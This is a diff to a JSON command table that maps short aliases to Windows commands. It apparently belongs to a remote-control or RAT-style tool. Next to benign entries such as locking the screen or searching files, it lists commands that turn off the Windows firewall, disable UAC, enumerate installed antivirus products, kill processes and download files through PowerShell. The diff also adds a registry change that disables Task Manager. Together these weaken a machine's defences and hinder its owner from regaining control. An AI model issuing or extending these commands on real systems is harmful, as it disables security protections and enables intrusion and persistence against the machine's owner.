@@ -1,11 +1,16 @@
 {
   "drive": "wmic logicaldisk get caption,description",
-  "startup": "wmic startup get description,location",
+  "_startup": "wmic startup get description,location",
   "plist": "wmic process get description,processid,executablepath",
-  "pkill": "wmic process where name='<process name>' call terminate",
+  "_pkill": "wmic process where name='<process name>' call terminate",
   "enumav": "wmic /namespace:\\\\root\\SecurityCenter2 path AntivirusProduct get displayName",
   "killfw": "netsh advfirewall set allprofiles state off",
   "checkti": "whoami /groups | findstr TrustedInstaller",
+  "touch": "type nul > <filename>",
+  "search": "where /r <path> <filename>",
+  "downloadfile": "powershell.exe (new-object System.Net.WebClient).DownloadFile('<url>', '<filename>')",
+  "lockscreen": "rundll32.exe user32.dll,LockWorkStation",
+  "showdesktop": "powershell.exe (New-Object -ComObject shell.application).toggleDesktop()",
   "disableuac": "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f",
-  "downloadfile": "powershell.exe (new-object System.Net.WebClient).DownloadFile('<url>', '<filename>')"
+  "disabletaskmgr": "reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f"
 }
